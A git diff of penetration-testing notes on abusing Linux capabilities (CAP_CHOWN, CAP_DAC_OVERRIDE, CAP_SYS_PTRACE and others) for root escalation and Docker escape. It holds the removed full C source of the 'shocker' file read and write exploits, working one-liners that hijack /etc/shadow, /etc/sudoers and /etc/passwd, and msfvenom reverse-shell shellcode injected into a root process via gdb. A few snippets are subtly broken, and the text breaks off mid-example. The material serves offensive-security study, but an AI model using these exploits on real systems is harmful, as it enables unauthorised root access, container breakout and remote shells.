@@ -18,6 +18,7 @@ This minimizes the risks by not granting full root privileges unnecessarily.
 >
 > - [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html)
 > - [GTFOBins](https://gtfobins.github.io/#+capabilities)
+>
 <!-- }}} -->
 
 ___
@@ -25,8 +26,14 @@ ___
 <!-- Enumerate {{{-->
 ## Enumerate
 
+Enumerate installed binaries with their set capabilities
+
 ```sh
 find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+```sh
+getcap -r / 2>/dev/null
 ```
 
 <!-- Info {{{-->
@@ -38,6 +45,7 @@ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \
 >
 > The output will show all binary executables,
 > along with their set capabilities
+>
 <!-- }}} -->
 
 <!-- Example {{{-->
@@ -63,244 +71,182 @@ ___
 <!-- CAP_CHOWN {{{-->
 ### CAP_CHOWN
 
-**This means that it's possible to change the ownership of any file.**
+[CAP_CHOWN](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+allows to make arbitrary changes to file UIDs and GIDs -
+Change the ownership of any file
 
-**Example with binary**
+1. Change the owner of [[Linux/General/Users & Groups#Shadow|Shadow]]
 
-Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change root password**, and escalate privileges:
+<!-- Example {{{-->
+> [!example]-
+>
+> [[Python/General|Python]]
+>
+> ```bash
+> python -c 'import os;os.chown("/etc/shadow",1000,1000)'
+> ```
+>
+> [[Ruby/General|Ruby]]
+>
+> ```bash
+> ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
+> ```
+<!-- }}} -->
 
-```bash
-python -c 'import os;os.chown("/etc/shadow",1000,1000)'
+2. [[Payloads/Files#File Overwrite|Change root password]]
+   and escalate privileges
+
+```sh
+echo "root:hacked" | chpasswd
 ```
 
-Or with the **`ruby`** binary having this capability:
-
-```bash
-ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
-```
-
+___
 <!-- }}} -->
 
 <!-- CAP_DAC_READ_SEARCH {{{-->
 ### CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables a process to **bypass permissions for reading files and for reading and executing directories**. Its primary use is for file searching or reading purposes. However, it also allows a process to use the `open_by_handle_at(2)` function, which can access any file, including those outside the process's mount namespace. The handle used in `open_by_handle_at(2)` is supposed to be a non-transparent identifier obtained through `name_to_handle_at(2)`, but it can include sensitive information like inode numbers that are vulnerable to tampering. The potential for exploitation of this capability, particularly in the context of Docker containers, was demonstrated by Sebastian Krahmer with the shocker exploit, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
-**This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**
+[CAP_DAC_READ_SEARCH](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+allows a process to bypass permissions for reading files
+and for reading and executing directories
 
-**Example with binary**
+Read files via [GTFOBins](https://gtfobins.org/#/^file%20read$/)
 
-The binary will be able to read any file. So, if a file like tar has this capability it will be able to read the shadow file:
+<!-- Info {{{-->
+> [!info]-
+>
+> Its primary use is for file searching or reading purposes.
+>
+> However, it also allows a process
+> to use the `open_by_handle_at(2)` function,
+> which can access any file,
+> including those outside the process's mount namespace.
+>
+> The handle used in `open_by_handle_at(2)` is supposed to be
+> a non-transparent identifier obtained through `name_to_handle_at(2)`,
+> but it can include sensitive information like inode numbers
+> that are vulnerable to tampering.
+>
+> The potential for exploitation of this capability,
+> particularly in the context of Docker containers,
+> was demonstrated by Sebastian Krahmer with the shocker exploit,
+> as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
+>
+<!-- }}} -->
 
-```bash
-cd /etc
-tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
-cd /tmp
-tar -cxf shadow.tar.gz
-```
+<!-- Example {{{-->
+> [!example]-
+>
+> [[tar]] — [Read File](https://gtfobins.org/gtfobins/tar/#file-read)
+>
+> ```sh
+> cd /etc
+> ```
+> ```sh
+> tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
+> ```
+> ```sh
+> cd /tmp
+> ```
+> ```sh
+> tar -cxf shadow.tar.gz
+> ```
+>
+<!-- }}} -->
 
-**Example with binary2**
+<!-- Example {{{-->
+> [!example]-
+>
+> [[Python/General|Python]] — [Read File](https://gtfobins.org/gtfobins/python/#file-read)
+>
+> 1. List `root`'s files
+>
+> ```python
+> import os
+> for r, d, f in os.walk('/root'):
+>     for filename in f:
+>         print(filename)
+> ```
+>
+> 2. Read a file
+>
+> ```python
+> print(open("/etc/shadow", "r").read())
+> ```
+<!-- }}} -->
 
-In this case lets suppose that **`python`** binary has this capability. In order to list root files you could do:
+<!-- Example {{{-->
+> [!example]-
+>
+> [[Docker]] breakout
+>
+> 1. Check the enabled capabilities inside the docker container
+>
+> ```sh
+> capsh --print
+> ```
+> ```sh
+> Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
+> Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+> Securebits: 00/0x0/1'b0
+>  secure-noroot: no (unlocked)
+>  secure-no-suid-fixup: no (unlocked)
+>  secure-keep-caps: no (unlocked)
+> uid=0(root)
+> gid=0(root)
+> groups=0(root)
+> ```
+>
+> 2. The [[#CAP_DAC_READ_SEARCH]] capability is enabled,
+>    so that the container can **debug processes**
+>
+> <!-- Tip {{{-->
+> > [!tip]
+> >
+> > [Exploit](https://codeberg.org/marcellbarsony/pentest-resources/src/branch/main/Exploits/Privesc/Linux/shocker)
+> >
+> > [Exploit source](http://stealth.openwall.net/xSports/shocker.c)
+> >
+> > [Exploit Analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
+> >
+> <!-- }}} -->
+>
+> [[#CAP_DAC_READ_SEARCH]]
+> not only allows traversing the file system without permission checks,
+> but also explicitly removes any checks to `open_by_handle_at(2)`
+> and could allow our process to sensitive files opened by other processes
+>
+> <!-- Warning {{{-->
+> > [!warning]
+> >
+> > The exploit needs to find a pointer to something mounted on the host.
+> > The original exploit used the file `/.dockerinit`
+> > and this modified version uses `/etc/hostname`.
+> >
+> > If the exploit isn't working, set a different file.
+> >
+> > To find a file that is mounted in the host just execute `mount`
+> >
+> > ```sh
+> > mount
+> > ```
+> >
+> <!-- }}} -->
+>
+<!-- }}} -->
 
-```python
-import os
-for r, d, f in os.walk('/root'):
-    for filename in f:
-        print(filename)
-```
-
-And in order to read a file you could do:
-
-```python
-print(open("/etc/shadow", "r").read())
-```
-
-**Example in Environment (Docker breakout)**
-
-You can check the enabled capabilities inside the docker container using:
-
-```
-capsh --print
-Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
-Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
-Securebits: 00/0x0/1'b0
- secure-noroot: no (unlocked)
- secure-no-suid-fixup: no (unlocked)
- secure-keep-caps: no (unlocked)
-uid=0(root)
-gid=0(root)
-groups=0(root)
-```
-
-Inside the previous output you can see that the **DAC_READ_SEARCH** capability is enabled. As a result, the container can **debug processes**.
-
-You can learn how the following exploiting works in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP_DAC_READ_SEARCH** not only allows us to traverse the file system without permission checks, but also explicitly removes any checks to _**open_by_handle_at(2)**_ and **could allow our process to sensitive files opened by other processes**.
-
-The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**
-
-```c
-#include <stdio.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <dirent.h>
-#include <stdint.h>
-
-// gcc shocker.c -o shocker
-// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir
-
-struct my_file_handle {
-    unsigned int handle_bytes;
-    int handle_type;
-    unsigned char f_handle[8];
-};
-
-void die(const char *msg)
-{
-    perror(msg);
-    exit(errno);
-}
-
-void dump_handle(const struct my_file_handle *h)
-{
-    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
-    h->handle_type);
-    for (int i = 0; i < h->handle_bytes; ++i) {
-        fprintf(stderr,"0x%02x", h->f_handle[i]);
-        if ((i + 1) % 20 == 0)
-        fprintf(stderr,"\n");
-        if (i < h->handle_bytes - 1)
-        fprintf(stderr,", ");
-    }
-    fprintf(stderr,"};\n");
-}
-
-int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
-*oh)
-{
-    int fd;
-    uint32_t ino = 0;
-    struct my_file_handle outh = {
-    .handle_bytes = 8,
-    .handle_type = 1
-    };
-    DIR *dir = NULL;
-    struct dirent *de = NULL;
-    path = strchr(path, '/');
-    // recursion stops if path has been resolved
-    if (!path) {
-        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
-        oh->handle_type = 1;
-        oh->handle_bytes = 8;
-        return 1;
-    }
-
-    ++path;
-    fprintf(stderr, "[*] Resolving '%s'\n", path);
-    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
-        die("[-] open_by_handle_at");
-    if ((dir = fdopendir(fd)) == NULL)
-        die("[-] fdopendir");
-    for (;;) {
-        de = readdir(dir);
-        if (!de)
-        break;
-        fprintf(stderr, "[*] Found %s\n", de->d_name);
-        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
-            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
-            ino = de->d_ino;
-            break;
-        }
-    }
-
-    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
-    if (de) {
-        for (uint32_t i = 0; i < 0xffffffff; ++i) {
-            outh.handle_bytes = 8;
-            outh.handle_type = 1;
-            memcpy(outh.f_handle, &ino, sizeof(ino));
-            memcpy(outh.f_handle + 4, &i, sizeof(i));
-            if ((i % (1<<20)) == 0)
-                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
-            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
-                closedir(dir);
-                close(fd);
-                dump_handle(&outh);
-                return find_handle(bfd, path, &outh, oh);
-            }
-        }
-    }
-    closedir(dir);
-    close(fd);
-    return 0;
-}
-
-
-int main(int argc,char* argv[] )
-{
-    char buf[0x1000];
-    int fd1, fd2;
-    struct my_file_handle h;
-    struct my_file_handle root_h = {
-        .handle_bytes = 8,
-        .handle_type = 1,
-        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
-    };
-
-    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
-    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
-    "[***] If you have pending sec consulting, I'll happily [***]\n"
-    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
-
-    read(0, buf, 1);
-
-    // get a FS reference from something mounted in from outside
-    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
-        die("[-] open");
-
-    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
-        die("[-] Cannot find valid handle!");
-
-    fprintf(stderr, "[!] Got a final handle!\n");
-    dump_handle(&h);
-
-    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
-        die("[-] open_by_handle");
-
-    memset(buf, 0, sizeof(buf));
-    if (read(fd2, buf, sizeof(buf) - 1) < 0)
-        die("[-] read");
-
-    printf("Success!!\n");
-
-    FILE *fptr;
-    fptr = fopen(argv[2], "w");
-    fprintf(fptr,"%s", buf);
-    fclose(fptr);
-
-    close(fd2); close(fd1);
-
-    return 0;
-}
-```
-
-> [!WARNING]
-> The exploit needs to find a pointer to something mounted on the host. The original exploit used the file /.dockerinit and this modified version uses /etc/hostname. If the exploit isn't working maybe you need to set a different file. To find a file that is mounted in the host just execute mount command:
-
-![](<../../images/image (407) (1).png>)
-
-**The code of this technique was copied from the laboratory of "Abusing DAC_READ_SEARCH Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
-
+___
 <!-- }}} -->
 
 <!-- CAP_DAC_OVERRIDE {{{-->
 ### CAP_DAC_OVERRIDE
 
-Bypass write permission checks on any file
+[CAP_DAC_OVERRIDE](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+allows to bypass write permission checks on any file
+
+> [!tip]- Payloads
+>
+> [Payloads - Overwriting a file](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/payloads-to-execute.html#overwriting-a-file-to-escalate-privileges)
 
 <!-- Example {{{-->
 > [!example]-
@@ -308,56 +254,70 @@ Bypass write permission checks on any file
 > Use `vim` to modify any file
 > (*e.g., `/etc/passwd`, `/etc/sudoers`, `shadow`*)
 >
-> ```bash
+> 1. Enumerate capabilities
+>
+> ```sh
 > getcap -r / 2>/dev/null
+> ```
+> ```sh
 > /usr/bin/vim = cap_dac_override+ep
 > ```
+>
+> 2. Write the file
 >
 > ```sh
 > /usr/bin/vim /etc/passwd
 > ```
+>
 <!-- }}} -->
 
 <!-- Example {{{-->
 > [!example]-
 >
-> Non-interactive mode:
+> **Non-interactive mode**
+>
 > Use `su` to log in as `root` without being asked for the password
+>
+> 1. Overwrite `/etc/passwd` to enable `root` login without password
 >
 > ```sh
 > echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim -es /etc/passwd
 > ```
+>
+> 2. Check `/etc/passwd`
+>
 > ```sh
 > cat /etc/passwd | head -n1
 > ```
 > ```sh
 > root::0:0:root:/root:/bin/bash
 > ```
+>
+> 3. Log in as `root`
+>
 > ```sh
 > su
 > ```
+>
 <!-- }}} -->
 
 <!-- Example {{{-->
 > [!example]-
 >
-> Use `python` to modify any file
+> [[Python/General|Python]] — [Write File](https://gtfobins.org/gtfobins/python/#file-write)
 >
 > ```python
 > file=open("/etc/sudoers","a")
-> file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
+> file.write("<user> ALL=(ALL) NOPASSWD:ALL")
 > file.close()
 > ```
-<!-- }}} -->
-
-> [!tip]- Payloads
 >
-> [Payloads - Overwriting a file](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/payloads-to-execute.html#overwriting-a-file-to-escalate-privileges)
-
-**Example with environment + CAP_DAC_READ_SEARCH (Docker breakout)**
+<!-- }}} -->
 
 <!-- Example {{{-->
 > [!example]-
+>
+> `CAP_DAC_READ_SEARCH` [[Docker]] breakout
 >
 > Check the enabled capabilities inside the Docker container
 >
@@ -379,151 +339,10 @@ Bypass write permission checks on any file
 
 1. Read [[#CAP_DAC_READ_SEARCH]] on how to read arbitrary files
 2. Compile the following version of the shocker exploit
-   that will allows to **write arbitrary files**
+   that will allows to write arbitrary files
    inside the host's filesystem
 
-<!-- Example {{{-->
-> [!example]-
->
-> ```c
-> #include <stdio.h>
-> #include <sys/types.h>
-> #include <sys/stat.h>
-> #include <fcntl.h>
-> #include <errno.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <unistd.h>
-> #include <dirent.h>
-> #include <stdint.h>
->
-> // gcc shocker_write.c -o shocker_write
-> // ./shocker_write /etc/passwd passwd
->
-> struct my_file_handle {
->   unsigned int handle_bytes;
->   int handle_type;
->   unsigned char f_handle[8];
-> };
-> void die(const char * msg) {
->   perror(msg);
->   exit(errno);
-> }
-> void dump_handle(const struct my_file_handle * h) {
->   fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
->     h -> handle_type);
->   for (int i = 0; i < h -> handle_bytes; ++i) {
->     fprintf(stderr, "0x%02x", h -> f_handle[i]);
->     if ((i + 1) % 20 == 0)
->       fprintf(stderr, "\n");
->     if (i < h -> handle_bytes - 1)
->       fprintf(stderr, ", ");
->   }
->   fprintf(stderr, "};\n");
-> }
-> int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
-> {
->   int fd;
->   uint32_t ino = 0;
->   struct my_file_handle outh = {
->     .handle_bytes = 8,
->     .handle_type = 1
->   };
->   DIR * dir = NULL;
->   struct dirent * de = NULL;
->   path = strchr(path, '/');
->   // recursion stops if path has been resolved
->   if (!path) {
->     memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
->     oh -> handle_type = 1;
->     oh -> handle_bytes = 8;
->     return 1;
->   }
->   ++path;
->   fprintf(stderr, "[*] Resolving '%s'\n", path);
->   if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
->     die("[-] open_by_handle_at");
->   if ((dir = fdopendir(fd)) == NULL)
->     die("[-] fdopendir");
->   for (;;) {
->     de = readdir(dir);
->     if (!de)
->       break;
->     fprintf(stderr, "[*] Found %s\n", de -> d_name);
->     if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
->       fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
->       ino = de -> d_ino;
->       break;
->     }
->   }
->   fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
->   if (de) {
->     for (uint32_t i = 0; i < 0xffffffff; ++i) {
->       outh.handle_bytes = 8;
->       outh.handle_type = 1;
->       memcpy(outh.f_handle, & ino, sizeof(ino));
->       memcpy(outh.f_handle + 4, & i, sizeof(i));
->       if ((i % (1 << 20)) == 0)
->         fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
->       if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
->         closedir(dir);
->         close(fd);
->         dump_handle( & outh);
->         return find_handle(bfd, path, & outh, oh);
->       }
->     }
->   }
->   closedir(dir);
->   close(fd);
->   return 0;
-> }
-> int main(int argc, char * argv[]) {
->   char buf[0x1000];
->   int fd1, fd2;
->   struct my_file_handle h;
->   struct my_file_handle root_h = {
->     .handle_bytes = 8,
->     .handle_type = 1,
->     .f_handle = {
->       0x02,
->       0,
->       0,
->       0,
->       0,
->       0,
->       0,
->       0
->     }
->   };
->   fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
->     "[***] The tea from the 90's kicks your sekurity again. [***]\n"
->     "[***] If you have pending sec consulting, I'll happily [***]\n"
->     "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
->   read(0, buf, 1);
->   // get a FS reference from something mounted in from outside
->   if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
->     die("[-] open");
->   if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
->     die("[-] Cannot find valid handle!");
->   fprintf(stderr, "[!] Got a final handle!\n");
->   dump_handle( & h);
->   if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
->     die("[-] open_by_handle");
->   char * line = NULL;
->   size_t len = 0;
->   FILE * fptr;
->   ssize_t read;
->   fptr = fopen(argv[2], "r");
->   while ((read = getline( & line, & len, fptr)) != -1) {
->     write(fd2, line, read);
->   }
->   printf("Success!!\n");
->   close(fd2);
->   close(fd1);
->   return 0;
-> }
-> ```
-<!-- }}} -->
+[[Exploits/shocker.c]]
 
 To scape the Docker container
 
@@ -532,39 +351,60 @@ To scape the Docker container
 3. Use `shocker_write` to overwrite them
 4. Then, access via [[SSH/General|SSH]]
 
+___
 <!-- }}} -->
 
 <!-- CAP_FOWNER {{{-->
 ### CAP_FOWNER
 
-**This means that it's possible to change the permission of any file.**
+[CAP_FOWNER](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+allows to change the permission of any file
 
-**Example with binary**
+<!-- Example {{{-->
+> [!example]-
+>
+> [[Python/General|Python]]
+>
+> ```bash
+> python -c 'import os;os.chmod("/etc/shadow",0666)
+> ```
+>
+> [[Ruby/General|Ruby]]
+>
+> ```sh
+> ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
+> ```
+>
+<!-- }}} -->
 
-If python has this capability you can modify the permissions of the shadow file, **change root password**, and escalate privileges:
-
-```bash
-python -c 'import os;os.chmod("/etc/shadow",0666)
-```
-
+___
 <!-- }}} -->
 
 <!-- CAP_KILL {{{-->
 ### CAP_KILL
 
-**This means that it's possible to kill any process.**
+[CAP_KILL](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+allows to kill any process
 
-**Example with binary**
-
-Lets suppose the **`python`** binary has this capability. If you could **also modify some service or socket configuration** (or any configuration file related to a service) file, you could backdoor it, and then kill the process related to that service and wait for the new configuration file to be executed with your backdoor.
-
-```python
-#Use this python code to kill arbitrary processes
-import os
-import signal
-pgid = os.getpgid(341)
-os.killpg(pgid, signal.SIGKILL)
-```
+<!-- Example {{{-->
+> [!example]-
+>
+> [[Python/General|Python]] - Kill arbitrary processes
+>
+> ```python
+> import os
+> import signal
+> pgid = os.getpgid(341)
+> os.killpg(pgid, signal.SIGKILL)
+> ```
+>
+> If you could also modify some service or socket configuration file
+> (or any configuration file related to a service),
+> you could backdoor i
+> and then kill the process related to that service
+> and wait for the new configuration file to be executed with your backdoor.
+>
+<!-- }}} -->
 
 **Privesc with kill**
 
@@ -574,11 +414,6 @@ If you have kill capabilities and there is a **node program running as root** (o
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
-
-
-{{#ref}}
-electron-cef-chromium-debugger-abuse.md
-{{#endref}}
 
 <!-- }}} -->
 
@@ -921,7 +756,8 @@ It looks like we can only add to the inheritable set capabilities from the bound
 <!-- CAP_SETGID {{{-->
 ### CAP_SETGID
 
-**This means that it's possible to set the effective group id of the created process.**
+[CAP_SETGID](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+allows to set the effective group id of the created process
 
 There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
@@ -979,7 +815,7 @@ In summary, `CAP_SETPCAP` allows a process to modify the capability sets of othe
 [CAP_SETUID](https://man7.org/linux/man-pages/man7/capabilities.7.html)
 allows to set effective `UID` of the created process
 
-PHP
+[[PHP/General|PHP]]
 
 <!-- Example {{{-->
 > [!example]-
@@ -1003,7 +839,7 @@ PHP
 > ```
 <!-- }}} -->
 
-Python
+[[Python/General|Python]]
 
 <!-- Example {{{-->
 > [!example]-
@@ -1045,7 +881,7 @@ Python
 > ```
 <!-- }}} -->
 
-Ruby
+[[Ruby/General|Ruby]]
 
 <!-- Example {{{-->
 > [!example]-
@@ -1380,11 +1216,47 @@ This can be useful for **privilege escalation** and **Docker breakout.**
 <!-- CAP_SYS_PTRACE {{{-->
 ### CAP_SYS_PTRACE
 
-**This means that you can escape the container by injecting a shellcode inside some process running inside the host.** To access processes running inside the host the container needs to be run at least with **`--pid=host`**.
+[CAP_SYS_PTRACE](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+allows to escape the container
+by injecting a shellcode inside some process
+running inside the host
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** grants the ability to use debugging and system call tracing functionalities provided by `ptrace(2)` and cross-memory attach calls like `process_vm_readv(2)` and `process_vm_writev(2)`. Although powerful for diagnostic and monitoring purposes, if `CAP_SYS_PTRACE` is enabled without restrictive measures like a seccomp filter on `ptrace(2)`, it can significantly undermine system security. Specifically, it can be exploited to circumvent other security restrictions, notably those imposed by seccomp, as demonstrated by [proofs of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53).
+To access processes running inside the host
+the container needs to be run at least with `--pid=host`
+
+<!-- Info {{{-->
+> [!info]-
+>
+> [CAP_SYS_PTRACE](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+> grants the ability to use debugging and system call tracing functionalities
+> provided by `ptrace(2)` and cross-memory attach calls
+> like `process_vm_readv(2)` and `process_vm_writev(2)`.
+>
+> Although powerful for diagnostic and monitoring purposes,
+> if `CAP_SYS_PTRACE` is enabled without restrictive measures
+> like a seccomp filter on `ptrace(2)`,
+> it can significantly undermine system security.
+>
+> Specifically, it can be exploited to circumvent other security restrictions,
+> notably those imposed by seccomp,
+> as demonstrated by
+> [proofs of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53).
+>
+>
+>
+<!-- }}} -->
 
 **Example with binary (python)**
+
+<!-- Example {{{-->
+> [!example]-
+>
+> [[Python/General|Python]]
+> ```sh
+>
+> ```
+<!-- }}} -->
+
 
 ```bash
 getcap -r / 2>/dev/null
@@ -1482,71 +1354,75 @@ getcap -r / 2>/dev/null
 > ```
 <!-- }}} -->
 
-**Example with binary (gdb)**
-
-`gdb` with `ptrace` capability:
-
-```
-/usr/bin/gdb = cap_sys_ptrace+ep
-```
-
-Create a shellcode with msfvenom to inject in memory via gdb
-
 <!-- Example {{{-->
 > [!example]-
 >
-> ```python
-> # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
-> buf =  b""
-> buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
-> buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
-> buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
-> buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
-> buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
-> buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
-> buf += b"\x0f\x05"
+> [gdb](https://en.wikipedia.org/wiki/GNU_Debugger)
+> ` with `ptrace` capability:
 >
-> # Divisible by 8
-> payload = b"\x90" * (-len(buf) % 8) + buf
->
-> # Change endianess and print gdb lines to load the shellcode in RIP directly
-> for i in range(0, len(buf), 8):
-> 	chunk = payload[i:i+8][::-1]
-> 	chunks = "0x"
-> 	for byte in chunk:
-> 		chunks += f"{byte:02x}"
->
-> 	print(f"set {{long}}($rip+{i}) = {chunks}")
+> ```sh
+> /usr/bin/gdb = cap_sys_ptrace+ep
 > ```
-<!-- }}} -->
-
-Debug a root process with gdb ad copy-paste the previously generated gdb lines:
-
-<!-- Example {{{-->
-> [!example]-
 >
-> ```bash
-> # Let's write the commands to a file
-> echo 'set {long}($rip+0) = 0x296a909090909090
-> set {long}($rip+8) = 0x5e016a5f026a9958
-> set {long}($rip+16) = 0x0002b9489748050f
-> set {long}($rip+24) = 0x48510b0e0a0a2923
-> set {long}($rip+32) = 0x582a6a5a106ae689
-> set {long}($rip+40) = 0xceff485e036a050f
-> set {long}($rip+48) = 0x6af675050f58216a
-> set {long}($rip+56) = 0x69622fbb4899583b
-> set {long}($rip+64) = 0x8948530068732f6e
-> set {long}($rip+72) = 0x050fe689485752e7
-> c' > commands.gdb
-> # In this case there was a sleep run by root
-> ## NOTE that the process you abuse will die after the shellcode
-> /usr/bin/gdb -p $(pgrep sleep)
-> [...]
-> (gdb) source commands.gdb
-> Continuing.
-> process 207009 is executing new program: /usr/bin/dash
-> [...]
-> ```
+> Create a shellcode with msfvenom to inject in memory via gdb
+>
+> <!-- Example {{{-->
+> > [!example]-
+> >
+> > ```python
+> > # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
+> > buf =  b""
+> > buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
+> > buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
+> > buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
+> > buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
+> > buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
+> > buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
+> > buf += b"\x0f\x05"
+> >
+> > # Divisible by 8
+> > payload = b"\x90" * (-len(buf) % 8) + buf
+> >
+> > # Change endianess and print gdb lines to load the shellcode in RIP directly
+> > for i in range(0, len(buf), 8):
+> > 	chunk = payload[i:i+8][::-1]
+> > 	chunks = "0x"
+> > 	for byte in chunk:
+> > 		chunks += f"{byte:02x}"
+> >
+> > 	print(f"set {{long}}($rip+{i}) = {chunks}")
+> > ```
+> <!-- }}} -->
+>
+> Debug a root process with gdb ad copy-paste the previously generated gdb lines:
+>
+> <!-- Example {{{-->
+> > [!example]-
+> >
+> > ```bash
+> > # Let's write the commands to a file
+> > echo 'set {long}($rip+0) = 0x296a909090909090
+> > set {long}($rip+8) = 0x5e016a5f026a9958
